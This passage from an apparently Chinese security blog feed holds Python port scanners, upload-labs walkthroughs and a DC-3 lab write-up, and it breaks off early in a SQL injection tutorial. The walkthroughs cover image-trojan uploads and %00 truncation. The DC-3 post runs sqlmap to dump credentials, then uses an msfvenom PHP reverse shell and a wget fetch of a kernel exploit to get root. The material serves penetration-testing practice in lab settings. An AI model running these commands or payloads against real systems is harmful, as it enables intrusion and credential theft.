class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import socket,sys</span><br><span class="line"># 判断端口开放</span><br><span class="line">def open(ip,port):</span><br><span class="line">    s=socket.socket()</span><br><span class="line">    try:</span><br><span class="line">        s.connect((ip,port))</span><br><span class="line">        return True</span><br><span class="line">    except:</span><br><span class="line">        return False</span><br><span class="line">def scan(ip,portlist):</span><br><span class="line">    for i in portlist:</span><br><span class="line">        if open(ip,i):</span><br><span class="line">            print(&quot;%s host %s port open&quot;%(ip,i))</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;%s host %s port close&quot; % (ip, i))</span><br><span class="line">def rscan(ip,start,end):</span><br><span class="line">    for i in range(start,end):</span><br><span class="line">        if open(ip,i):</span><br><span class="line">            print(&quot;%s host %s port open&quot;%(ip,i))</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;%s host %s port close&quot;%(ip,i))</span><br><span class="line">#单个端口扫描：</span><br><span class="line">def pscan(ip,port):</span><br><span class="line">    if open(ip, port):</span><br><span class="line">        print(&quot;%s host %s port open&quot; % (ip, port))</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;%s host %s port close&quot; % (ip, port))</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    defaultports=[135,139,443,445,80,3306,22,1433,3389]</span><br><span class="line">    cs1=sys.argv[1]</span><br><span class="line">    if len(sys.argv)==2:</span><br><span class="line">        if cs1[0]==&#x27;-&#x27;:</span><br><span class="line">            options=cs1[1:]</span><br><span class="line">            if options==&#x27;version&#x27;:</span><br><span class="line">                print(&quot;当前版本是1.0&quot;)</span><br><span class="line">            elif options==&#x27;help&#x27;:</span><br><span class="line">                print(&quot;python jxf.py [ip] [port]&quot;)</span><br><span class="line">            sys.exit()</span><br><span class="line">        # 设置默认扫描为127.0.0.1</span><br><span class="line">        else:</span><br><span class="line">            scan(cs1,defaultports)</span><br><span class="line">    #参数有逗号的情况</span><br><span class="line">    elif len(sys.argv)==3:</span><br><span class="line">        if &#x27;,&#x27; in sys.argv[2]:</span><br><span class="line">            a=sys.argv[2]</span><br><span class="line">            b=a.split(&#x27;,&#x27;)#字符串分割</span><br><span class="line">            aport=[]</span><br><span class="line">            for i in b:</span><br><span class="line">                aport.append(int(i))</span><br><span class="line">            scan(sys.argv[1],aport)</span><br><span class="line">        # 范围扫描</span><br><span class="line">        elif &#x27;-&#x27; in sys.argv[2]:</span><br><span class="line">            S=sys.argv[2]</span><br><span class="line">            S=S.split(&#x27;-&#x27;)</span><br><span class="line">            start=int(S[0])</span><br><span class="line">            end=int(S[1])</span><br><span class="line">            rscan(sys.argv[1],start,end)</span><br><span class="line">        else:</span><br><span class="line">            aport2 = sys.argv[2]</span><br><span class="line">            aport2 = int(aport2)</span><br><span class="line">            pscan(sys.argv[1], aport2)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">        main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="端口扫描器-二"><a href="#端口扫描器-二" class="headerlink" title="端口扫描器 二"></a>端口扫描器 二</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">from optparse import OptionParser</span><br><span class="line">#判断连接</span><br><span class="line">def open(ip,port):</span><br><span class="line">    s=socket.socket()</span><br><span class="line">    try:</span><br><span class="line">        s.connect((ip, port))</span><br><span class="line">        return True</span><br><span class="line">    except:</span><br><span class="line">        return False</span><br><span class="line">def scan(ip,port):</span><br><span class="line">    for i in port:</span><br><span class="line">        if open(ip,i):</span><br><span class="line">            print(&quot;%s host %s port open&quot;%(ip,i))</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;%s host %s port close&quot;% (ip, i))</span><br><span class="line">def rscan(ip,start,end):</span><br><span class="line">    for i in range(start,end):</span><br><span class="line">        if open(ip,i):</span><br><span class="line">            print(&quot;%s host %s port open&quot;%(ip,i))</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;%s host %s port close&quot;% (ip, i))</span><br><span class="line">def pscan(ip,port):</span><br><span class="line">    if open(ip, port):</span><br><span class="line">        print(&quot;%s host %s port open&quot; % (ip, port))</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;%s host %s port close&quot; % (ip, port))</span><br><span class="line">def main():</span><br><span class="line">    usage=&quot;usage:xxx.py -i ip地址 -p 端口&quot;</span><br><span class="line">    parse=OptionParser(usage=usage)</span><br><span class="line">    parse.add_option(&quot;-i&quot;,&quot;--ip&quot;,type=&quot;string&quot;,dest=&quot;ipaddress&quot;,help=&quot;your targe  ip here&quot;)</span><br><span class="line">    parse.add_option(&quot;-p&quot;,&quot;--port&quot;,type=&quot;string&quot;,dest=&quot;port&quot;,help=&quot;your  targe port here&quot;)</span><br><span class="line">    (options,args)=parse.parse_args()</span><br><span class="line">    ip=options.ipaddress</span><br><span class="line">    port=options.port</span><br><span class="line">    defaultport=[80,135,139,443,445,3306,3389,8080]</span><br><span class="line">    if &#x27;,&#x27; in port:</span><br><span class="line">        port=port.split(&#x27;,&#x27;)</span><br><span class="line">        port1=[]</span><br><span class="line">        for i in port:</span><br><span class="line">            port1.append(int(i))</span><br><span class="line">        scan(ip,port1)</span><br><span class="line">    elif &#x27;-&#x27; in port:</span><br><span class="line">        port=port.split(&#x27;-&#x27;)</span><br><span class="line">        start=int(port[0])</span><br><span class="line">        end=int(port[1])</span><br><span class="line">        rscan(ip,start,end)</span><br><span class="line">    elif &#x27;all&#x27; in port:</span><br><span class="line">        rscan(ip,1,65535)</span><br><span class="line">    elif &#x27;defaultport&#x27; in port:</span><br><span class="line">        scan(ip,defaultport)</span><br><span class="line">    else:</span><br><span class="line">        pscan(ip,port)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;python端口扫描器&quot;&gt;&lt;a href=&quot;#python端口扫描器&quot; class=&quot;headerlink&quot; title=&quot;python端口扫描器&quot;&gt;&lt;/a&gt;python端口扫描器&lt;/h2&gt;</summary>
    
    
    
    
    <category term="python" scheme="http://xzajyjs2.ltd/tags/python/"/>
    
    <category term="端口扫描" scheme="http://xzajyjs2.ltd/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="http://xzajyjs2.ltd/2021/08/15/uploadfile2/"/>
    <id>http://xzajyjs2.ltd/2021/08/15/uploadfile2/</id>
    <published>2021-08-15T15:14:35.631Z</published>
    <updated>2021-08-17T08:17:56.932Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件上传通关靶场（下）"><a href="#文件上传通关靶场（下）" class="headerlink" title="文件上传通关靶场（下）"></a>文件上传通关靶场（下）</h2><span id="more"></span><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><h3 id="制作木马图片方法"><a href="#制作木马图片方法" class="headerlink" title="制作木马图片方法"></a>制作木马图片方法</h3><h4 id="方法一-在命令行中执行"><a href="#方法一-在命令行中执行" class="headerlink" title="方法一(在命令行中执行)"></a>方法一(在命令行中执行)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 123.jpeg /a + m.php /b muma.jpg</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 123.jpeg /b + m.php /a muma.jpg</span><br></pre></td></tr></table></figure><h4 id="方法二（在命令行中执行）"><a href="#方法二（在命令行中执行）" class="headerlink" title="方法二（在命令行中执行）"></a>方法二（在命令行中执行）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在内容代码前面加上</span><br><span class="line">GIF89a</span><br></pre></td></tr></table></figure><h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h4><p>使用c32(直接把木马的代码粘贴在图片木马后面)</p><h4 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h4><blockquote><p>用get方法保存路径，可以使用%00隔断，电脑会把%00后面的内容忽略.<br>修改后：</p></blockquote><p><img src="/img/pass-11.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先用burpsuit抓包，然后再使用%00修改保存路径</span><br></pre></td></tr></table></figure><h4 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h4><blockquote><p>这题和pass-11差不多，只是这题是post请求，修改位置不一样<br>修改后的路径(注意，%00进行url编码)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../upload/muma.php</span><br></pre></td></tr></table></figure><h4 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h4><p>制作木马图片上传</p><h4 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h4><blockquote><p>在代码文件头上加上GIF89a<br><img src="/img/pass-14.jpg"><br>再使用文件包含去执行</p></blockquote><h4 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h4><p>和pass-14一样</p><h4 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h4><blockquote><p>首先上传一个格式为gif的木马，是可以成功，但是用文件包含，发现不能成功，直接可以把图片进行压缩(二次渲染)，再使用文件包含漏洞执行木马</p></blockquote><h4 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h4><blockquote><p>unlink条件竞争<br>先把你的文件上传到服务器上，再对文件类型进行判断，我们可以使用burpsuit进行持续的上传，服务器可能会来不及删除</p></blockquote><p>使用burpsuit抓包<br>send to intruder<br>修改内容<br><img src="/img/pass-17.jpg"><br>payload选择number</p><h4 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h4><blockquote><p>代码中出现.7z .zip .rar .gz这种压缩类型的文件，php有可能会自动解压,此题目中会对它进行重命名，和上面题目一样，使用竞争原理，可能会来不及重命名，</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在上传的文件名后面加上.7z(zip,rar,gz)</span><br><span class="line">再持续上传</span><br></pre></td></tr></table></figure><h4 id="pass-19"><a href="#pass-19" class="headerlink" title="pass-19"></a>pass-19</h4><blockquote><p>这个和前面的一样为%00截断</p></blockquote><h4 id="pass-20"><a href="#pass-20" class="headerlink" title="pass-20"></a>pass-20</h4><blockquote><p>对pass-20进行代码审计<br>对抓包结果修改</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/jpeg (绕过MIME) </span><br><span class="line">  </span><br><span class="line">-----------------------------38972217413806  </span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[0]&quot;  </span><br><span class="line">  </span><br><span class="line">upload-20.php.  </span><br><span class="line">-----------------------------38972217413806  </span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[2]&quot;</span><br><span class="line">.jpg</span><br></pre></td></tr></table></figure><p>使用[0],[2]目的是不让他进行分割，<br>[2]里面数值为2,是让后面合并时候，末尾为空，而不为.jpg</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;文件上传通关靶场（下）&quot;&gt;&lt;a href=&quot;#文件上传通关靶场（下）&quot; class=&quot;headerlink&quot; title=&quot;文件上传通关靶场（下）&quot;&gt;&lt;/a&gt;文件上传通关靶场（下）&lt;/h2&gt;</summary>
    
    
    
    
    <category term="漏洞利用" scheme="http://xzajyjs2.ltd/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    <category term="文件上传" scheme="http://xzajyjs2.ltd/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>实站dc-3</title>
    <link href="http://xzajyjs2.ltd/2021/08/08/dc-3/"/>
    <id>http://xzajyjs2.ltd/2021/08/08/dc-3/</id>
    <published>2021-08-07T16:55:18.286Z</published>
    <updated>2021-10-11T18:23:12.703Z</updated>
    
    <content type="html"><![CDATA[<h2 id="dc-3靶场通关"><a href="#dc-3靶场通关" class="headerlink" title="dc-3靶场通关"></a>dc-3靶场通关</h2><span id="more"></span><h2 id="引言"><a href="#引言" class="headerlink" title="引言:"></a>引言:</h2><blockquote><p>此实验靶场为dc-3,主要想通过此次实验对渗透测试本身有一个深入的了解,也可以把自己形成自己的渗透思维.将自己的渗透思维和所学的渗透方法利用起来(漏洞利用,工具使用,信息的收集),这是我第一次写关于这方面的实验,如果有什么不合理的,请多多各位大佬多多体谅哦哦!(渗透小白)</p></blockquote><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集:"></a>信息收集:</h3><ul><li>使用nmap对目标IP(或者域名)进行扫描:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV  192.168.101.13</span><br></pre></td></tr></table></figure><img src="/img/dc-3-1.png" alt="信息1"><blockquote><p>发现目标<strong>开放80端口,开启了apache服务</strong></p></blockquote></li><li>再使用whatweb对目标网站扫描,得到详细的网站信息<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.101.13/</span><br></pre></td></tr></table></figure><img src="/img/dc-3-2.png" alt="信息2"><blockquote><p>发现网站的框架是joomla</p></blockquote></li><li>发现joomla框架后,我们用专们针对joomla框架的进行目录扫描(joomascan)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomascan http://192.168.101.13/</span><br></pre></td></tr></table></figure><blockquote><p>出现了jooma的版本是3.7.0  ,以及网站管理员登录页面(如下)<br><img src="/img/dc-3-3.png" alt="信息3"></p></blockquote><h3 id="寻找漏洞-进入终端"><a href="#寻找漏洞-进入终端" class="headerlink" title="寻找漏洞,进入终端 :"></a>寻找漏洞,进入终端 :</h3></li><li>查漏洞<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla 3.7.0</span><br></pre></td></tr></table></figure><img src="/img/dc-3-4.png" alt="漏洞"><blockquote><p>把漏洞的txt文件下载下来,打开后发现是一个sql注入的漏洞,直接按照步骤进行数据的查找</p></blockquote></li><li>漏洞位置<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br></pre></td></tr></table></figure></li><li>使用sqlmap进行SQL注入<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.101.13/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.101.13/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb --tables  -p list[fullordering]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.101.13/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T #__users --columns  -p list[fullordering]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.101.13/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &quot;#__users&quot; -C name,password --dump -p list[fullordering]</span><br></pre></td></tr></table></figure><blockquote><p>可以发现用户名和密码的hash值<br><img src="/img/dc-3-5.png"></p></blockquote></li><li>对于密码的hash值,可以使用john破解(把密码的hash值写入文件名为mima.txt里面,<strong>注意文件路径,我是在当前目录</strong>)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john mima.txt</span><br></pre></td></tr></table></figure><img src="/img/dc-3-14.png"><br>发现密码是snoopy</li><li>然后登录管理员的后台,发现Templates–&gt;Templates–&gt;Protostar Details and Files–&gt;error.php可以插入内容(可以插入php的一句话木马)</li><li><strong>生成木马(借助metaspliot)</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp  lhost=192.168.101.130  lport=4444 -f raw &gt;shell.php</span><br></pre></td></tr></table></figure></li><li>把生成的php木马内容放入管理员后台中error.php内容中,<br><img src="/img/dc-3-8.png"></li><li>访问error.php(触发漏洞)<br>! <a href="/img/dc-3-9.png"></a></li><li><strong>设置监听:</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set LHOST 192.168.101.130</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set LPORT 4444</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><blockquote><p>现在meterpreter中目标上线<br>输入shell  进入命令行</p></blockquote><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3></li><li>查看基本信息<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -C &#x27;import pty;pty.sqawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">whoami</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><img src="/img/dc-3-10.png"><blockquote><p>发现自己是普通用户,使用的系统是ubuntu 16.0.4(要提权到root权限)</p></blockquote></li><li>寻找ubuntu 16.0.4 提权漏洞<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ubuntu 16.0.4</span><br></pre></td></tr></table></figure><img src="/img/dc-3-6.png"><br>通过实验可知,所指的漏洞是具有可行性的<blockquote><p>我们现在的目的是要把找到的漏洞文件发送到目标的服务器上(我们已经能够在目标终端执行一些命令),可以把自己的电脑当成网站(<strong>kali非常简单  !!!</strong> ),让目标终端执行命令下载</p></blockquote></li><li>先另开一个窗口,直接执行python搭建的网站命令<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer :80</span><br></pre></td></tr></table></figure><img src="/img/dc-3-7.png"></li><li>目标终端执行:(<strong>下面的IP为自己这边IP,注意自己漏洞文件所在位置,和你执行python搭建网站命令的路径</strong>)  </li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.101.10:80/39772/exploit.tar</span><br></pre></td></tr></table></figure><blockquote><p><strong>漏洞文件名是为39772,由于wget不能下载目录,所以我直接下载里面的内容</strong></p></blockquote><ul><li>解压exploit.tar里面的内容,然后执行里面的文件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./compile</span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure><img src="/img/dc-3-12.png">  </li></ul><p><img src="/img/dc-3-13.png"></p><ul><li>输入whoami,发现你已经是root啦啦,恭喜你,成功入侵~~~</li></ul><h3 id="结语"><a href="#结语" class="headerlink" title="结语:"></a>结语:</h3><p>** 我们要时刻明白我们下一步需要什么,想清楚自己每一步目标,然后执行!!!,希望我的东西能给你带来灵魂的感悟**</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;dc-3靶场通关&quot;&gt;&lt;a href=&quot;#dc-3靶场通关&quot; class=&quot;headerlink&quot; title=&quot;dc-3靶场通关&quot;&gt;&lt;/a&gt;dc-3靶场通关&lt;/h2&gt;</summary>
    
    
    
    
    <category term="漏洞利用" scheme="http://xzajyjs2.ltd/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    <category term="sqlmap" scheme="http://xzajyjs2.ltd/tags/sqlmap/"/>
    
    <category term="木马生成" scheme="http://xzajyjs2.ltd/tags/%E6%9C%A8%E9%A9%AC%E7%94%9F%E6%88%90/"/>
    
    <category term="信息收集" scheme="http://xzajyjs2.ltd/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="实战" scheme="http://xzajyjs2.ltd/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>sql注入</title>
    <link href="http://xzajyjs2.ltd/2021/08/07/sql1/"/>
    <id>http://xzajyjs2.ltd/2021/08/07/sql1/</id>
    <published>2021-08-06T16:47:40.979Z</published>
    <updated>2021-08-09T16:40:31.415Z</updated>
    
    <content type="html"><![CDATA[<p>SQL注入</p><span id="more"></span><p>======================</p><h2 id="SQL的简介："><a href="#SQL的简介：" class="headerlink" title="SQL的简介："></a>SQL的简介：</h2><blockquote><p>SQL注入是利用是指利用设计上的漏洞，在目标服务器上运行Sql语句以及进行其他方式的攻击，SQL根据注入前端显示的不同，大可分为五类：普通注入，报错注入，布尔盲注，时间盲注，堆叠注入，根据不同情况可对应不同方法。时间盲注和布尔盲注由于需要不停的猜测，一般使用sqlmap(或者使用程序自动化运行，这里使用sqlmap)，普通情况和报错情况使用手工注入。</p></blockquote><h2 id="SQL注入语句的来源："><a href="#SQL注入语句的来源：" class="headerlink" title="SQL注入语句的来源："></a>SQL注入语句的来源：</h2><blockquote><p>sql语句是在数据库中对增删改查语句推断，从而去实现对语句的破坏，因而得到数据库的数据：</p></blockquote><ul><li>数据库的连接：</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  </span><br><span class="line">$servername = &quot;localhost&quot;;  </span><br><span class="line">$username = &quot;root&quot;;  </span><br><span class="line">$password = &quot;root&quot;;  </span><br><span class="line">$dbname = &quot;haha&quot;;  </span><br><span class="line">  </span><br><span class="line">//创建连接  </span><br><span class="line">$con = new mysqli($servername,$username,$password,$dbname);  </span><br><span class="line">  </span><br><span class="line">//检测连接  </span><br><span class="line">if($con-&gt;connect_error)&#123;  </span><br><span class="line">die(&quot;wo si le:&quot;.$con-&gt;connect_error);  </span><br><span class="line">&#125;</span><br><span class="line">//断开数据库连接  </span><br><span class="line">$con-&gt;close();  </span><br><span class="line">?</span><br></pre></td></tr></table></figure><ul><li>增语句：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO table1(id,username,password) VALUES(`,&#x27;jxd&#x27;,&#x27;test&#x27;)&quot;;</span><br></pre></td></tr></table></figure></li><li>查询语句：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM table1 WHERE id = 1&quot;;</span><br></pre></td></tr></table></figure></li><li>删除语句<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;DELETE FROM table1 WHERE id=21&quot;;</span><br></pre></td></tr></table></figure></li><li>修改语句<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;UPDATE table1 SET password=&#x27;niubi&#x27; WHERE username=&#x27;xiaohong&#x27;&quot;;</span><br></pre></td></tr></table></figure><h2 id="SQL手工注入"><a href="#SQL手工注入" class="headerlink" title="SQL手工注入"></a>SQL手工注入</h2><h3 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h3></li><li>查看闭合方式<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-4/index.php?id=1\</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/f2f1261762e14982b37e472bf6fc6bbf.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzOTQ3Nzgw,size_16,color_FFFFFF,t_70#pic_center"></li></ul><p><strong>注意：去除前后的单引号，发现闭合方式为 “) 闭合</strong></p><ul><li><p>确认闭合方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-4/index.php?id=1&quot;) --+</span><br></pre></td></tr></table></figure></li><li><p>[1] 发现没有报错，显示正常，说明闭合正确(–+为注释后面的语句)</p></li><li><p>确认有多少个报错位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-4/index.php?id=1&quot;) order by 3--+</span><br></pre></td></tr></table></figure></li></ul><p> 可以使用二分法进行猜测，发现到3显示正常页面</p><ul><li><p>查库名 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 